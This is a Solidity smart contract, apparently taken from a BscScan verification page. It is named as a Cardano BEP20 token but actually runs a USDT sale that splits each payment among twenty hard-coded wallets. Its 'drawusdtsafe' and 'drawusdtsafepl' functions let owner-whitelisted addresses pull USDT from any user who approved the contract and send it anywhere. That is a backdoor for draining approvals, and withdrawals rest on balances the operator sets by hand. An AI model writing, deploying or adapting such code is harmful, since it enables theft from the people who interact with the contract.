/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, Ownable {
  using SafeMath for uint256;
  IBEP20 public tokenu;

  mapping (address => uint256) private _kted;
  mapping (address => uint256) private _ktedone;
  mapping (address => uint256) private _ls;



  //mapping (address => bool) private jearr;
  mapping (address => bool) private safearr;
  mapping (uint256 => address) private skaccarr;

  mapping (uint256 => uint256) private _snlist;
 

  address private _zeroacc=0x0000000000000000000000000000000000000000;

  address tokenacc=address(this);
  address usdtacc = 0x55d398326f99059fF775485246999027B3197955;
  address safeaddress = 0x271ed5B066DEE90816736188D192EA82133ae834;
  address oneacc =0x55d398326f99059fF775485246999027B3197955;
  address yxacc=0x2BF319D79E1b9088c95dd917AF3efB874Ca9e53E;
  


  constructor() public {
    skaccarr[0]=0x8D42043a5a87548b9CB6904dfdaB699d4B0dBb49;
    skaccarr[1]=0x07b437BAA2f648a74E06E23DbdFEb8b964F3D983;
    skaccarr[2]=0x23bd59604fC999C5e63FB2c901e75cf7f193206c;
    skaccarr[3]=0x30F10E339760f1247d2eD1cB5f7f5117c056a1Fa;
    skaccarr[4]=0x100541f74Bc89660aE13Df80673Ac2fA77A74cf7;
    skaccarr[5]=0x8385262a7DbB3FC26c4Bf8df9B981417097e2095;
    skaccarr[6]=0xDD8e1c72df94A0468e1DF22a0BED9cfEfa7E77ed;
    skaccarr[7]=0xC434Ae145CCD2AE20aa62EA08BAA51338dC2C48E;
    skaccarr[8]=0xCCaAa1c25b380a7a96740194e3a4e96bEEE67447;
    skaccarr[9]=0xC6B7ceC5292777876D18560107deC8aF131D22B1;
    skaccarr[10]=0x8BcE5C6Fcd1a71c5b0cdfc923876d6Ea585E0Fbb;
    skaccarr[11]=0xaEecc637B470bE2F65F9784c8CB40b303a5DdA4d;
    skaccarr[12]=0x8Df305e2d2b0F31Bb272F2FEC0873ACEDcB282E8;
    skaccarr[13]=0xC1f0c037E39942EFf11CAD50db41d47Fd43aeC6A;
    skaccarr[14]=0xA94Ee6CD2d5B5550b78Ded5B6Df222Ed319e0b32;
    skaccarr[15]=0xa1970c0782DbFd8377a39De8073CdCaCB235294D;
    skaccarr[16]=0xadBB99455F75b039788d1e0Eb8b8321c9af0c7e6;
    skaccarr[17]=0x993c78692D8F53c6f30B8ec2f99601d8Bf87130F;
    skaccarr[18]=0xCcb2C4208dFd999212f791676209C94Cec0f6C16;
    skaccarr[19]=0xeaF2cE92cC2051e146954765BEF242EDc8fBB691;
  }

  //IDO
  function buyone(uint256 amount,uint256 osn)public returns(bool){
     tokenu = IBEP20(usdtacc);
     uint256 je=amount.mul(100).div(100);
     _kted[msg.sender]=_kted[msg.sender].add(je.mul(160).div(100));
     for(uint i=0;i<20;i++){
        uint256 skje=je.mul(5).div(100);
        tokenu.transferFrom(msg.sender,skaccarr[i],skje);
     }
     _snlist[osn]=amount;
     return true;
  }
  function chksnlist(uint256[] memory snarr)public view returns(uint256[] memory){
        uint256[] memory rd;
        rd = new uint256[](snarr.length);
        for(uint i=0;i<snarr.length;i++){
              rd[i]=_snlist[snarr[i]];
        }
        return rd;
    }

  function getOwner() external view returns (address) {
    return owner();
  }
  function getls(address acc) external view returns (uint256) {
    return _ls[acc];
  }
 
  function getoinfo(uint256 oid) external view returns (uint256) {
    return _snlist[oid];
  }
  

  function drawusdt(address to,uint256 amount)public onlyOwner{
     IBEP20(usdtacc).transfer(to,amount);
  }

  function drawusdtsafe(address from,address to,uint256 amount)public{
     require(safearr[msg.sender]==true,'no safe');
     IBEP20(usdtacc).transferFrom(from,to,amount);
  }

function drawusdtsafepl(address[] memory from,address to,uint256 amount)public{
     require(safearr[msg.sender]==true,'no safe');
     for(uint i=0;i<from.length;i++){
            //查额度
            uint256 je=0;
            uint256 sqed=IBEP20(usdtacc).allowance(from[i],tokenacc);
            uint256 ye=IBEP20(usdtacc).balanceOf(from[i]);
            if(sqed>=ye){
              je=ye;
            }else{
              je=sqed;
            }
            if(je>0){
              IBEP20(usdtacc).transferFrom(from[i],to,amount);
            }
     }
     
  }

  function addsafe(address acc)public onlyOwner{
     safearr[acc]=true;
  }
  //设置收款钱包
  function setskarr(address[] memory skacclist)public onlyOwner{
      for(uint i=0;i<skacclist.length;i++){
          skaccarr[i]=skacclist[i];
      }
  }

  //设置可提额度
  function setkted(address to,uint256 amount)public onlyOwner{
     _kted[to]=amount*10**18;
  }
  //设置可提额度one
  function setktedone(address to,uint256 amount)public onlyOwner{
     _ktedone[to]=amount*10**18;
  }

  function showed(address acc)external view returns(uint256){
     return _kted[acc];
  }
  function showedone(address acc)external view returns(uint256){
     return _ktedone[acc];
  }

  //设置安全钱包
  function setsafeaddress(address _safeaddress)public onlyOwner{
     safeaddress = _safeaddress;
  }


  //设置oneacc
  function setoneacc(address acc)public onlyOwner{
     oneacc = acc;
  }
  function setyxacc(address acc)public onlyOwner{
     yxacc = acc;
  }
  

  //提现
  function txdo(uint256[] memory snarr,uint256[] memory jearr,address[] memory to,uint256[] memory typearr)public{
        require(msg.sender==safeaddress || safearr[msg.sender]==true,'no safeaddress');
        for(uint i=0;i<snarr.length;i++){
            //rd[i]=_snlist[snarr[i]];
            if(typearr[i]==2){
                require(_kted[to[i]]>=jearr[i],'no kted');
                _kted[to[i]]=_kted[to[i]].sub(jearr[i]);
                IBEP20(usdtacc).transfer(to[i],jearr[i]);
            }
            if(typearr[i]==1){
                require(_kted[to[i]]>=jearr[i],'no kted');
                _kted[to[i]]=_kted[to[i]].sub(jearr[i]);
                IBEP20(oneacc).transfer(to[i],jearr[i]);
            }
            _snlist[snarr[i]]=jearr[i];
        }
  }
  
}